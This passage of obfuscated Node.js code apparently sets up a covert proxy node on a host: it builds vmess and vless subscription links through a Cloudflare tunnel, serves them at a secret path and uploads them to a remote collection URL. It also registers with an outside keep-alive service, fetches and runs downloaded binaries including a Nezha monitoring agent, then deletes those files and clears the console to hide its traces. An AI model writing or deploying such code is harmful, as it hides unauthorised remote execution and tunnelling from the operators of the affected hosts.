axios[_0x511abf(0x266)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x3a8e15[_0x511abf(_0x2775ae._0x57a98a)]&&_0x3a8e15[_0x511abf(_0x2775ae._0x303741)][_0x511abf(_0x2775ae._0x5a60ee)]===_0x511abf(0x1ea)&&_0x3a8e15[_0x511abf(_0x2775ae._0x57a98a)]['countryCode']&&_0x3a8e15[_0x511abf(_0x2775ae._0x2391c7)]['org'])return _0x3a8e15[_0x511abf(_0x2775ae._0x2391c7)][_0x511abf(0x248)]+'_'+_0x3a8e15[_0x511abf(0x22b)][_0x511abf(0x225)];}catch(_0x1800bf){}}return _0x511abf(_0x2775ae._0x8817c9);}async function _0x5f3417(_0x58f217){const _0x30131c={_0x34d9f2:0x259,_0x21c419:0x256,_0x1d2e75:0x276,_0x40e315:0x296,_0x229672:0x227,_0x33a78e:0x239,_0x3c1571:0x27b,_0x46a7fe:0x21a,_0x170e6b:0x288,_0x9ba531:0x28d},_0x1b5fde=await _0x53be1a(),_0x5f5cd6=NAME?NAME+'-'+_0x1b5fde:_0x1b5fde;return new Promise(_0x17e160=>{setTimeout(()=>{const _0x5297dd={_0x28fbec:0x255,_0x335d4d:0x24c},_0x18d03a=_0x1ebf,_0x356008={'v':'2','ps':''+_0x5f5cd6,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x18d03a(0x28a),'host':_0x58f217,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x58f217,'alpn':'','fp':_0x18d03a(_0x30131c._0x34d9f2)},_0x4ad6e0=_0x18d03a(0x1e2)+UUID+'@'+CFIP+':'+CFPORT+_0x18d03a(_0x30131c._0x21c419)+_0x58f217+_0x18d03a(0x239)+_0x58f217+_0x18d03a(_0x30131c._0x1d2e75)+_0x5f5cd6+_0x18d03a(_0x30131c._0x40e315)+Buffer['from'](JSON['stringify'](_0x356008))[_0x18d03a(0x288)]('base64')+_0x18d03a(_0x30131c._0x229672)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x58f217+_0x18d03a(_0x30131c._0x33a78e)+_0x58f217+_0x18d03a(0x208)+_0x5f5cd6+'\x0a\x20\x20\x20\x20';console[_0x18d03a(_0x30131c._0x3c1571)](Buffer['from'](_0x4ad6e0)['toString']('base64')),fs[_0x18d03a(_0x30131c._0x46a7fe)](subPath,Buffer[_0x18d03a(0x261)](_0x4ad6e0)[_0x18d03a(_0x30131c._0x170e6b)](_0x18d03a(0x255))),console['log'](FILE_PATH+_0x18d03a(_0x30131c._0x9ba531)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x9306e9,_0x27b389)=>{const _0x4627a7=_0x18d03a,_0x3bd4e0=Buffer['from'](_0x4ad6e0)[_0x4627a7(0x288)](_0x4627a7(_0x5297dd._0x28fbec));_0x27b389['set'](_0x4627a7(_0x5297dd._0x335d4d),_0x4627a7(0x246)),_0x27b389[_0x4627a7(0x250)](_0x3bd4e0);}),_0x17e160(_0x4ad6e0);},0x7d0);});}}async function uploadNodes(){const _0x2eb50c={_0x5b0758:0x271,_0x416ef2:0x27b,_0x1b32f0:0x204,_0x5eae72:0x297,_0xc3865d:0x25c},_0x58e4f0=_0x2abb86;if(UPLOAD_URL&&PROJECT_URL){const _0x6f1ce1=PROJECT_URL+'/'+SUB_PATH,_0x5758f7={'subscription':[_0x6f1ce1]};try{const _0x469bcc=await axios['post'](UPLOAD_URL+_0x58e4f0(_0x2eb50c._0x5b0758),_0x5758f7,{'headers':{'Content-Type':_0x58e4f0(0x25c)}});return _0x469bcc&&_0x469bcc[_0x58e4f0(0x204)]===0xc8?(console[_0x58e4f0(_0x2eb50c._0x416ef2)](_0x58e4f0(0x22f)),_0x469bcc):null;}catch(_0x2974b9){if(_0x2974b9[_0x58e4f0(0x1fd)]){if(_0x2974b9[_0x58e4f0(0x1fd)][_0x58e4f0(_0x2eb50c._0x1b32f0)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x58e4f0(_0x2eb50c._0x5eae72)](listPath))return;const _0xf381d5=fs[_0x58e4f0(0x1e4)](listPath,'utf-8'),_0x1e36b2=_0xf381d5['split']('\x0a')[_0x58e4f0(0x26e)](_0x870a74=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x870a74));if(_0x1e36b2['length']===0x0)return;const _0x35e0f2=JSON['stringify']({'nodes':_0x1e36b2});try{const _0x2b934a=await axios[_0x58e4f0(0x1e6)](UPLOAD_URL+'/api/add-nodes',_0x35e0f2,{'headers':{'Content-Type':_0x58e4f0(_0x2eb50c._0xc3865d)}});return _0x2b934a&&_0x2b934a[_0x58e4f0(0x204)]===0xc8?(console[_0x58e4f0(0x27b)](_0x58e4f0(0x1ed)),_0x2b934a):null;}catch(_0x4fa234){return null;}}else return;}}function cleanFiles(){const _0x530973={_0x507ba5:0x1e8,_0x55af97:0x245,_0x58c02d:0x28b,_0x2e303a:0x27f,_0x30d0e6:0x201},_0x22fac6={_0xd0c11d:0x27b,_0x1797e2:0x27c,_0x1915b8:0x230},_0x601ae2={_0x1fa4c6:0x230};setTimeout(()=>{const _0x2202b2=_0x1ebf,_0x5754eb=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5754eb[_0x2202b2(0x1e8)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5754eb[_0x2202b2(_0x530973._0x507ba5)](phpPath);process['platform']===_0x2202b2(0x21f)?exec('del\x20/f\x20/q\x20'+_0x5754eb['join']('\x20')+_0x2202b2(_0x530973._0x55af97),_0x4422f9=>{const _0x29f414=_0x2202b2;console[_0x29f414(0x26b)](),console['log']('App\x20is\x20running'),console[_0x29f414(0x27b)](_0x29f414(_0x601ae2._0x1fa4c6));}):exec(_0x2202b2(_0x530973._0x58c02d)+_0x5754eb[_0x2202b2(_0x530973._0x2e303a)]('\x20')+_0x2202b2(_0x530973._0x30d0e6),_0x238818=>{const _0x12d8c5=_0x2202b2;console['clear'](),console[_0x12d8c5(_0x22fac6._0xd0c11d)](_0x12d8c5(_0x22fac6._0x1797e2)),console['log'](_0x12d8c5(_0x22fac6._0x1915b8));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x12f95f={_0x52633b:0x222,_0x62243c:0x1e6,_0xdf984e:0x25c,_0x53f118:0x229},_0x347081=_0x2abb86;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x347081(0x27b)](_0x347081(_0x12f95f._0x52633b));return;}try{const _0x39208f=await axios[_0x347081(_0x12f95f._0x62243c)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x347081(_0x12f95f._0xdf984e)}});return console['log'](_0x347081(0x25b)),_0x39208f;}catch(_0xbe9e5c){return console[_0x347081(_0x12f95f._0x53f118)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0xbe9e5c[_0x347081(0x291)]),null;}}async function startserver(){const _0x5d0c17={_0x3b1a0b:0x29a},_0xc4e25f=_0x2abb86;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x25272e){console[_0xc4e25f(0x229)](_0xc4e25f(_0x5d0c17._0x3b1a0b),_0x25272e);}}startserver()[_0x2abb86(0x1ec)](_0x531c34=>{const _0x278d3a={_0x314b96:0x229},_0x256338=_0x2abb86;console[_0x256338(_0x278d3a._0x314b96)]('Unhandled\x20error\x20in\x20startserver:',_0x531c34);}),app[_0x2abb86(0x219)](PORT,()=>console[_0x2abb86(0x27b)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
